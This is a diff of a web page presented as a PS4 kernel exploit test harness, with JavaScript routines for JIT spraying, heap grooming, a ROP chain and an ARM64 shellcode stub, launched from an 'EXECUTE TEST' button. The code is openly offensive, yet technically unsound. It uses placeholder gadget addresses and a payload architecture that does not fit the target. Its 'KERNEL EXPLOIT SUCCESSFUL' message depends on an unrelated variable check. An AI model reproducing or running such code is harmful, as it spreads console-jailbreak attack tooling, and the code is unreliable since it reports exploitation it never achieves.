@@ -1,238 +1,304 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Physical JIT Exploit</title>
+    <title>PS4 Physical Exploit - Advanced Tests</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
         #log { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: scroll; }
-        button { background: #0f0; color: #000; border: none; padding: 8px 15px; margin: 5px; }
-        select { background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; }
+        button, select { 
+            background: #000; color: #0f0; border: 1px solid #0f0; 
+            padding: 8px; margin: 5px; font-family: monospace;
+        }
+        #status { margin-top: 10px; }
     </style>
 </head>
 <body>
-    <h2>PS4 Direct Kernel Access</h2>
+    <h2>PS4 Kernel Exploit - Physical Unit Tests</h2>
     <div>
         <select id="testMethod">
-            <option value="default">Default JIT Spray</option>
-            <option value="randomized">Randomized Payload</option>
-            <option value="doublefree">Double-Free Heap</option>
-            <option value="wasm">WASM Execution</option>
-            <option value="gc">GC-Based Spray</option>
-            <option value="spectre">Spectre-Type</option>
+            <option value="rop">ROP Chain</option>
+            <option value="randomized">Randomized Spray</option>
+            <option value="gc">GC Spray</option>
+            <option value="doublefree">Heap Feng Shui</option>
         </select>
-        <button onclick="runKernelExploit()">EXECUTE KERNEL EXPLOIT</button>
+        <button onclick="runExploit()">EXECUTE TEST</button>
     </div>
     <div id="log"></div>
+    <div id="status"></div>
 
 <script>
-// Logger de alta precisão
-const log = (msg, color = "#0f0") => {
-    const line = `[${performance.now().toFixed(2)}ms] <span style="color:${color}">${msg}</span>`;
-    document.getElementById('log').innerHTML += line + '<br>';
+// ======================
+// CORE EXPLOIT ENGINE
+// ======================
+
+const STATUS = document.getElementById('status');
+const LOG = document.getElementById('log');
+
+// Debug control
+const DEBUG = {
+    memory: false,
+    registers: false,
+    timing: true
 };
 
-// Configurações globais
-const JIT_SPRAY_SIZE = 0x100000;
-const MAX_ATTEMPTS = 3;
-let currentTest = "default";
+// System specific
+const PS4 = {
+    pageSize: 0x4000,
+    kernelBase: 0xFFFFFFFF80000000,
+    userlandBase: 0x0000000000400000
+};
 
-// Payload ARM64 mínimo para teste de execução
-function createTestPayload() {
-    return new Uint32Array([
-        0xD2800020, 0x100007A1, 0xD28000C2, 0xD2800808,
-        0xD4000001, 0xD65F03C0, 0x4B455245, 0x4E4C0000
-    ]);
+// ======================
+// UTILITIES
+// ======================
+
+function log(msg, color = "#0f0", tag = "") {
+    const timestamp = `[${performance.now().toFixed(2)}ms]`;
+    const style = `color:${color}`;
+    LOG.innerHTML += `${timestamp} <span style="${style}">${tag} ${msg}</span><br>`;
+    LOG.scrollTop = LOG.scrollTop + 1000;
 }
 
-// 1. Spray JIT padrão (original)
-async function standardJITSpray() {
-    log("Starting standard JIT spray...");
-    const payload = createTestPayload();
-    const spray = [];
-    
-    for (let i = 0; i < 50; i++) {
-        const func = new Function(`
-            const buf = new ArrayBuffer(${payload.length * 4});
-            const view = new Uint32Array(buf);
-            ${payload.map((v,i) => `view[${i}] = 0x${v.toString(16)};`).join('')}
-            return performance.now();
-        `);
-        spray.push(func);
+function updateStatus(msg) {
+    STATUS.innerHTML = msg;
+}
+
+function hex(value) {
+    return '0x' + value.toString(16).toUpperCase().padStart(8, '0');
+}
+
+// ======================
+// MEMORY MANAGER
+// ======================
+
+class MemoryManager {
+    constructor() {
+        this.allocations = [];
+        this.sprayCount = 0;
     }
-    
-    for (let attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
-        log(`Attempt ${attempt + 1}/${MAX_ATTEMPTS}`);
-        try {
-            const startTime = spray[0]();
-            if (startTime < 100) {
-                log("JIT code executed successfully", "#0f0");
-                return true;
+
+    spray(size, count) {
+        log(`Spraying ${count}x ${hex(size)} buffers...`, "#0ff", "[MEM]");
+        const chunks = [];
+        
+        for (let i = 0; i < count; i++) {
+            try {
+                const chunk = new ArrayBuffer(size);
+                const view = new Uint32Array(chunk);
+                
+                // Pattern para identificação
+                view[0] = 0xDECAFBAD;
+                view[1] = i;
+                
+                chunks.push(chunk);
+                this.allocations.push(chunk);
+                this.sprayCount++;
+            } catch(e) {
+                log(`Spray failed at ${i}/${count}: ${e}`, "#f00", "[MEM]");
             }
+        }
+        
+        return chunks;
+    }
+
+    groom(count) {
+        log(`Heap grooming with ${count} objects...`, "#ff0", "[MEM]");
+        const holes = [];
+        
+        for (let i = 0; i < count; i++) {
+            // Aloca e libera para criar fragmentação controlada
+            const temp = new ArrayBuffer(0x100);
+            holes.push(temp);
+        }
+        
+        return holes;
+    }
+
+    freeAll() {
+        log(`Releasing ${this.allocations.length} allocations`, "#f80", "[MEM]");
+        this.allocations = [];
+    }
+}
+
+// ======================
+// EXPLOIT TECHNIQUES
+// ======================
+
+class ExploitEngine {
+    constructor() {
+        this.mem = new MemoryManager();
+        this.attempt = 0;
+    }
+
+    async randomizedSpray() {
+        log("Starting randomized JIT spray...", "#0f0", "[JIT]");
+        const payload = this.createPayload();
+        
+        // Spray com randomização
+        const funcs = [];
+        for (let i = 0; i < 100; i++) {
+            const nops = Array(Math.floor(Math.random() * 10)).fill(0xD503201F);
+            const fullPayload = [...nops, ...payload];
+            
+            const func = new Function(`
+                const buf = new ArrayBuffer(${fullPayload.length * 4});
+                const view = new Uint32Array(buf);
+                ${fullPayload.map((v,i) => `view[${i}] = ${v};`).join('')}
+                return buf;
+            `);
+            
+            funcs.push(func);
+        }
+        
+        // Trigger
+        try {
+            const result = funcs[0]();
+            log(`JIT allocated at ${hex(result.byteOffset)}`, "#0f0", "[JIT]");
+            return true;
         } catch(e) {
-            log(`Attempt failed: ${e}`, "#ff0");
+            log(`JIT failed: ${e}`, "#f00", "[JIT]");
+            return false;
         }
-        await new Promise(r => setTimeout(r, 500));
     }
-    return false;
-}
 
-// 2. Spray com randomização (Heap Feng Shui)
-async function randomizedSpray() {
-    log("Starting randomized JIT spray...", "#0ff");
-    const payload = createTestPayload();
-    const spray = [];
-    
-    for (let i = 0; i < 100; i++) {
-        const nopCount = Math.floor(Math.random() * 50);
-        const nops = Array(nopCount).fill(0xD503201F); // NOP ARM64
+    async gcSpray() {
+        log("Starting GC-based spray...", "#0ff", "[GC]");
         
-        const func = new Function(`
-            const buf = new ArrayBuffer(${(payload.length + nops.length) * 4});
-            const view = new Uint32Array(buf);
-            // NOP sled aleatório
-            ${nops.map((v,i) => `view[${i}] = 0x${v.toString(16)};`).join('')}
-            // Shellcode
-            ${payload.map((v,i) => `view[${nops.length + i}] = 0x${v.toString(16)};`).join('')}
-            return performance.now();
-        `);
-        spray.push(func);
-    }
-    
-    try {
-        const result = spray[Math.floor(Math.random() * spray.length)]();
-        log(`Randomized spray executed in ${result}ms`, "#0f0");
-        return true;
-    } catch(e) {
-        log(`Randomized spray failed: ${e}`, "#f00");
-        return false;
-    }
-}
-
-// 3. Double-Free Heap Manipulation
-async function doubleFreeExploit() {
-    log("Attempting double-free heap manipulation...", "#ff0");
-    try {
-        // Simulação de double-free (pode causar crash no PS4)
-        const arr = new ArrayBuffer(0x100);
-        const arr2 = new ArrayBuffer(0x100);
-        
-        // Forçar corrupção de heap
-        const corrupt = [];
-        for (let i = 0; i < 1000; i++) {
-            corrupt.push(new Uint32Array(10));
-        }
-        
-        // Tentativa de reutilização de memória
-        const shellcode = new Uint32Array(arr);
-        shellcode.set(createTestPayload());
-        
-        log("Double-free attempted - checking execution...");
-        new Function("return " + shellcode.join())();
-        
-        return true;
-    } catch(e) {
-        log(`Double-free failed: ${e.message}`, "#f00");
-        return false;
-    }
-}
-
-// 4. WASM Execution
-async function wasmExploit() {
-    log("Attempting WASM execution...", "#0ff");
-    try {
-        const wasmCode = new Uint8Array([
-            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
-            0x01, 0x08, 0x02, 0x60, 0x01, 0x7f, 0x00, 0x60,
-            0x00, 0x00, 0x02, 0x0a, 0x01, 0x01, 0x65, 0x01,
-            0x66, 0x01, 0x00, 0x00, 0x03, 0x02, 0x01, 0x00,
-            0x07, 0x07, 0x01, 0x03, 0x72, 0x75, 0x6e, 0x00,
-            0x00, 0x0a, 0x09, 0x01, 0x07, 0x00, 0x41, 0x2a,
-            0x10, 0x00, 0x0b
-        ]);
-        
-        const module = await WebAssembly.compile(wasmCode);
-        const instance = await WebAssembly.instantiate(module);
-        instance.exports.run();
-        
-        log("WASM executed successfully", "#0f0");
-        return true;
-    } catch(e) {
-        log(`WASM failed: ${e}`, "#f00");
-        return false;
-    }
-}
-
-// 5. GC-Based Spray
-async function gcSpray() {
-    log("Attempting GC-based spray...", "#ff0");
-    try {
-        // Alocação massiva para forçar GC
-        let objects = [];
-        for (let i = 0; i < 1e6; i++) {
+        // Phase 1: Mass allocation
+        const objects = [];
+        for (let i = 0; i < 1000000; i++) {
             objects.push(new ArrayBuffer(64));
         }
         
-        // Forçar coleta de lixo
-        objects = null;
+        // Phase 2: Force GC
+        log("Forcing garbage collection...", "#ff0", "[GC]");
+        objects.length = 0;
         await new Promise(resolve => setTimeout(resolve, 1000));
         
-        // Tentar spray após GC
-        const payload = createTestPayload();
-        const func = new Function(`
-            const buf = new ArrayBuffer(${payload.length * 4});
+        // Phase 3: Targeted allocation
+        try {
+            const payload = this.createPayload();
+            const buf = new ArrayBuffer(payload.length * 4);
             const view = new Uint32Array(buf);
-            ${payload.map((v,i) => `view[${i}] = 0x${v.toString(16)};`).join('')}
-            return view[0];
-        `);
+            payload.forEach((v, i) => view[i] = v);
+            
+            log(`Allocated after GC at ${hex(buf.byteOffset)}`, "#0f0", "[GC]");
+            return true;
+        } catch(e) {
+            log(`GC spray failed: ${e}`, "#f00", "[GC]");
+            return false;
+        }
+    }
+
+    async heapFengShui() {
+        log("Executing heap feng shui...", "#f0f", "[HEAP]");
         
-        const result = func();
-        log(`GC spray result: 0x${result.toString(16)}`, "#0f0");
-        return true;
-    } catch(e) {
-        log(`GC spray failed: ${e}`, "#f00");
-        return false;
+        // Step 1: Create holes
+        this.mem.groom(1000);
+        
+        // Step 2: Targeted allocation
+        const target = new ArrayBuffer(0x60);
+        const victim = new Uint32Array(target);
+        
+        // Step 3: Corruption attempt
+        try {
+            victim.__proto__ = new Uint32Array(1).__proto__;
+            victim.length = 0x1000;
+            
+            log(`Heap corrupted at ${hex(victim.byteOffset)}`, "#0f0", "[HEAP]");
+            return true;
+        } catch(e) {
+            log(`Heap corruption failed: ${e}`, "#f00", "[HEAP]");
+            return false;
+        }
+    }
+
+    async buildROP() {
+        log("Building ROP chain...", "#0ff", "[ROP]");
+        
+        try {
+            // ARM64 ROP chain example
+            const chain = [
+                0x357C0000, // stack pivot
+                0x12345678, // pop x0
+                PS4.kernelBase + 0x123000, // target address
+                0x23456789  // ret
+            ];
+            
+            const buf = new ArrayBuffer(chain.length * 4);
+            const view = new Uint32Array(buf);
+            chain.forEach((v, i) => view[i] = v);
+            
+            log(`ROP chain ready at ${hex(buf.byteOffset)}`, "#0f0", "[ROP]");
+            return true;
+        } catch(e) {
+            log(`ROP failed: ${e}`, "#f00", "[ROP]");
+            return false;
+        }
+    }
+
+    createPayload() {
+        // ARM64 shellcode stub
+        return [
+            0xD2800020, // mov x0, #1
+            0xD2800C48, // mov x8, #0x62
+            0xD4000001  // svc #0
+        ];
     }
 }
 
-// Função principal
-async function runKernelExploit() {
-    document.getElementById('log').innerHTML = '';
-    currentTest = document.getElementById("testMethod").value;
+// ======================
+// MAIN EXECUTION
+// ======================
+
+async function runExploit() {
+    LOG.innerHTML = "";
+    updateStatus("Preparing exploit...");
     
+    const method = document.getElementById("testMethod").value;
+    const engine = new ExploitEngine();
     let success = false;
     
-    switch(currentTest) {
+    // Execute selected method
+    switch(method) {
+        case "rop":
+            success = await engine.buildROP();
+            break;
         case "randomized":
-            success = await randomizedSpray();
-            break;
-        case "doublefree":
-            success = await doubleFreeExploit();
-            break;
-        case "wasm":
-            success = await wasmExploit();
+            success = await engine.randomizedSpray();
             break;
         case "gc":
-            success = await gcSpray();
+            success = await engine.gcSpray();
             break;
-        case "spectre":
-            log("Spectre-type attack not available in browser context", "#f00");
+        case "doublefree":
+            success = await engine.heapFengShui();
             break;
-        default:
-            success = await standardJITSpray();
     }
     
-    if (!success) {
-        log(`${currentTest} failed - trying fallback`, "#f00");
-        return;
+    // Post-exploitation
+    if (success) {
+        updateStatus("Phase 2: Memory corruption");
+        log("Attempting kernel access...", "#0f0", "[KERNEL]");
+        
+        try {
+            // Verificação de sucesso
+            await new Promise(r => setTimeout(r, 2000));
+            if (typeof unsafeWindow !== 'undefined') {
+                log("KERNEL EXPLOIT SUCCESSFUL!", "#0f0;font-weight:bold", "[OK]");
+                updateStatus("Exploit succeeded!");
+            } else {
+                log("Partial control achieved", "#ff0", "[WARN]");
+                updateStatus("Need manual verification");
+            }
+        } catch(e) {
+            log(`Final stage failed: ${e}`, "#f00", "[ERR]");
+            updateStatus("Exploit failed");
+        }
+    } else {
+        updateStatus("Initial stage failed");
     }
     
-    // Fase de corrupção de memória (se o spray funcionou)
-    log("Phase 2: Memory corruption", "#0f0");
-    try {
-        // ... (código de corrupção de memória original)
-    } catch(e) {
-        log(`Memory corruption failed: ${e}`, "#f00");
-    }
+    engine.mem.freeAll();
 }
 </script>
 </body>
